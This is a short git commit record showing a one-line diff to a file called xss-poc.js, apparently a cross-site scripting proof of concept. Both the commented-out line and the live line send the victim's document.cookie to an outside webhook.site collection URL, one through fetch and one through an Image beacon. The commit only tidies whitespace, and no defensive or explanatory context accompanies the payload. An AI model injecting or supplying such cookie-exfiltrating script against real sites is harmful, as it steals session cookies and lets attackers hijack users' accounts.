1ca0897d4d6b5d0b68aa5169dcb49de9c17d06bd
g4mor <gamingreno57@gmail.com>
2024-08-07 00:46:31 -0400

    Update xss-poc.js

--- xss-poc.js
+++ xss-poc.js
@@ -1,3 +1,3 @@
 // fetch("https://webhook.site/18c2831e-1b84-447a-9808-1d5e576a0b27/?cookie=" + document.cookie);
 
-var i=new Image;i.src="https://webhook.site/18c2831e-1b84-447a-9808-1d5e576a0b27/?cookie=" + document.cookie;
+var i=new Image;i.src="https://webhook.site/18c2831e-1b84-447a-9808-1d5e576a0b27/?cookie="+document.cookie;
